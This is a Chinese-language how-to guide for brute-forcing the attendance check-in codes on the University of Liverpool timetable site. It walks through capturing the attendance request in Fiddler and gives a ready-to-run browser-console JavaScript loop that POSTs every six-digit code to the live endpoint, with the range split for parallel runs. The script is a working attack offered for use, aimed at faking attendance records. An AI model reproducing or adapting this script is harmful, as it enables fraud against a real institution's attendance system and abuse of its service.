# UoL - Attendance Code 爆破

<aside>
💡 **请谨慎使用**
此方法极易被检测到异常流量
不清楚现在及未来 管理员是否会针对该方法

</aside>

# 0. Intro

## 0.1 原理

通过浏览器开发人员控制台, 执行JS爆破

抓包, 模拟请求

由于涉及到 SSL证书 等操作, 这个方法比写程序容易操作很多, 无论是编写还是执行

## 0.2 可行性

执行时需要手动分成多个线程进行爆破, 每100000的耗时在2.78h左右 (间隔100ms)

据观察, 没有0开头的6位签到码

所以从100000-999999分成18组, 每组50000个, 并行爆破 

理想情况下, 仍需要1.3h

<aside>
💡 实测可行性不高
</aside>

# 1. 步骤

## 1.1 初始化准备

1. 浏览器
2. 抓包工具 (以 `Fiddler` 为例)

## 1.2 准备数据 (手动操作一遍, 获取请求信息)



1. 浏览器打开 Timetable
    
    [Sign In](https://timetables.liverpool.ac.uk/)
    
2. 打开 Fiddler
3. 进入timetable, 打开指定课程, 输入一次签到码
4. 切换回 Fiddler, 从左侧列表中的 `Host` 列, 找到 `timetables.liverpoo.ac.uk` 且其对应的  `URL`   列显示为 `/services/register-attendance-student` , 双击该行
    
    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3a352054-ceaa-444b-a420-1b33e16e0047/c0e70c2e-df67-4058-b784-bb332f4e7c0a/Untitled.png)
    

## 1.3 构建脚本数据



1. 选中 Fiddler 左侧行后, 右侧会显示 该数据包相关信息
2. 点击 `raw` 选项卡, 里边最后一行就是数据正
    
    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3a352054-ceaa-444b-a420-1b33e16e0047/9239a0a9-890c-4a94-9410-f59c8f88b11f/Untitled.png)
    
3. 从里边提取对应字段, 替换下方脚本代码 `body` 对应字段
    
    ```
    async function sendRequests() {
      // let i = 0; i <= 99999; i++ 好像没有0开头的
      // let i = 100000; i <= 149999; i++
      // let i = 150000; i <= 199999; i++
      // let i = 200000; i <= 249999; i++
      // let i = 250000; i <= 299999; i++
      // let i = 300000; i <= 349999; i++
      // let i = 350000; i <= 399999; i++
      // let i = 400000; i <= 449999; i++
      // let i = 450000; i <= 499999; i++
      // let i = 500000; i <= 549999; i++
      // let i = 550000; i <= 599999; i++
      // let i = 600000; i <= 649999; i++
      // let i = 650000; i <= 699999; i++
      // let i = 700000; i <= 749999; i++
      // let i = 750000; i <= 799999; i++
      // let i = 800000; i <= 849999; i++
      // let i = 850000; i <= 899999; i++
      // let i = 900000; i <= 949999; i++
      // let i = 950000; i <= 999999; i++
      for (let i = 0; i <= 999999; i++) {
        let attCodeInputValue = i.toString().padStart(6, "0");
    
        try {
          const response = await fetch(
            "https://timetables.liverpool.ac.uk/services/register-attendance-student",
            {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
              },
              // 此处做替换
              body: `attCodeInput=${attCodeInputValue}&
              uniqueId=your_uniqueid&actId=your_actid&attStart=your_attStart&attEnd=your_attEnd&location=your_location`,
            }
          );
    
          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }
    
          const data = await response.json();
          console.log(data);
        } catch (error) {
          console.error("Error:", error);
        }
    
        await new Promise((resolve) => setTimeout(resolve, 500)); 
      }
    }
    
    sendRequests();
    ```
    

## 1.4 发送数据



<aside>
💡 该步骤需要尽量细分 (多新建选项卡, 多分割代码区间)

</aside>

1. 切换回浏览器的Timetable选项卡
2. 按 `F12` 打开开发者控制台
3. 切换到 `console` 选项卡
4. 粘贴你刚刚构建好的脚本, 回车执行